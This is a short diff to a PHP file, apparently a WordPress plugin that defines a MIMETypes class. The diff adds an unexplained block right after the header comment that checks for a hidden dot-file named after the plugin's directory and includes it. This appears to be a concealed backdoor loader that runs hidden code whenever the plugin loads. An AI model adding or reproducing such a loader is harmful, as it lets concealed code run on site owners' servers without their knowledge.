@@ -13,7 +13,11 @@ if ( ! defined( 'ABSPATH' ) ) { exit; }
  *
  * If you use this, all I ask is that you let me know! I'd like to see who all uses this!
  * Also, credits would be much appreciated or a link back to codehelpers.com! Thanks :)
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MIMETypes {
 	# Define some private variables
 
